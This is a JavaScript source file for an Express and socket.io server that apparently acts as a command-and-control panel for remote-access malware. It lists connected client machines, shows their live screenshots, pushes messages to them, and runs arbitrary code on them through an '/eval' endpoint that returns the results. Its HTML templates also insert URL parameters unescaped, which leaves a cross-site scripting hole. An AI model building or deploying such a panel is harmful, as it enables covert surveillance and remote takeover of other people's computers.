const express = require('express');
const app = express();
const server = require('http').Server(app);
const io = require('socket.io')(server);
const longpoll = require("express-longpoll")(app);

const PORT = 3000;

app.use('/static', express.static('static'));

const clients = {};
let SCRIPT_ID_COUNTER = 0;
const scripts = {};

longpoll.create('/screen/:id', (req, res, next) => {
    req.id = req.params.id;
    next();
});

io.on("connection", socket => {
    const id = `${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`;
    console.log(`New client connected (${id}).`);
    
    clients[id] = socket;

    socket.on('screenshot', img => {
        longpoll.publishToId("/screen/:id", id, img.toString('base64'));
    });

    socket.on('eval', data => {
        if (scripts[data.id]) {
            scripts[data.id].status(200).json({result: data.result, status: 200});
            scripts[data.id] = null;
        }
    });

    socket.on('disconnect', () => {
        clients[id] = null;
    });
});

app.post('/message/:id', express.json(), (req, res) => {
    const socket = clients[req.params.id];
    if (socket) {
        socket.emit('message', req.body.message);
        res.status(200).json({status: 200});
    } else {
        res.status(404).json({status: 404});
    }
});

app.post('/eval/:id', express.json(), (req, res) => {
    const socket = clients[req.params.id];
    if (socket) {
        scripts[SCRIPT_ID_COUNTER] = res;
        socket.emit('eval', {id: SCRIPT_ID_COUNTER++, code: req.body.code});
    } else {
        res.status(404).json({status: 404});
    }
});

app.get('/view_screen/:id', (req, res) => {
    res.contentType('html')
    .status(200)
    .end(
`<html>
<head>
    <script src="/static/jquery.min.js"></script>
    <script>
        var subscribe = function(url, cb) {
            $.ajax({
                method: 'GET',
                url: url,
                success: function(data) {
                    cb(data);
                },
                complete: function() {
                    subscribe(url, cb);
                },
                error: function() {
                    $("#screen").attr('src', '/static/no-image.jpg');
                },
                timeout: 30000
            });
        };
        
        subscribe("/screen/${req.params.id}", (data) => {
            $("#screen").attr('src', 'data:image/png;base64, ' + data);
        });
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        .imgbox {
            display: grid;
            height: 100%;
        }
        .center-fit {
            max-width: 100%;
            max-height: 100vh;
            margin: auto;
        }
    </style>
</head>
<body>
<div class="imgbox">
    <img class="center-fit" id="screen" src="/static/no-image.jpg" />
</div>
</body>

</html>`
    );
});

const listStreams = () => {
    let body = [];
    for (const [clientId, socket] of Object.entries(clients)) {
        if (socket) {
            body.push(`<li><a href="/client/${clientId}">${clientId}</a></li>`);
        }
    }
    return body.join('\n');
};

app.get('/client/:id', (req, res) => {
    res.contentType('html')
    .status(200)
    .end(
`<html>
<head>
    <script src="/static/jquery.min.js"></script>
    <script>
        function sendMessage() {
            $.ajax({
                url: "/message/${req.params.id}",
                type: "post",
                dataType: "json",
                contentType: "application/json",
                success: function (data) {
                    alert("Message sent!");
                },
                error: function() {
                    alert("ERROR - Message not sent!");
                },
                data: JSON.stringify({ message: $("#message").val() })
            });
        }

        function executeCode() {
            $.ajax({
                url: "/eval/${req.params.id}",
                type: "post",
                dataType: "json",
                contentType: "application/json",
                success: function (data) {
                    alert(data.result);
                },
                error: function() {
                    alert("ERROR - Could not execute the code!");
                },
                data: JSON.stringify({ code: $("#code").val() })
            });
        }
    </script>
</head>
<body>
    <h1>Options</h1>
    </br>
    <p>1) <a href="/view_screen/${req.params.id}">View screen</a></p>
    <p>2) Send message: <input type="text" id="message"></input> <button type="button" onclick="sendMessage()">Send</button></p>
    <p>3) Execute code: <form><textarea rows="10" cols="60" type="text" id="code"></textarea></form> <button type="button" onclick="executeCode()">Execute</button></p>
</body>
</html>`
    );
});

app.get('/', (req, res) => {
    res.contentType('html')
    .status(200)
    .end(
`<html>
<body>
    <ul>
        ${listStreams()}
    </ul>
</body>
</html>`
    );
});

server.listen(PORT, () => console.log(`Server listening on port ${PORT}!`));
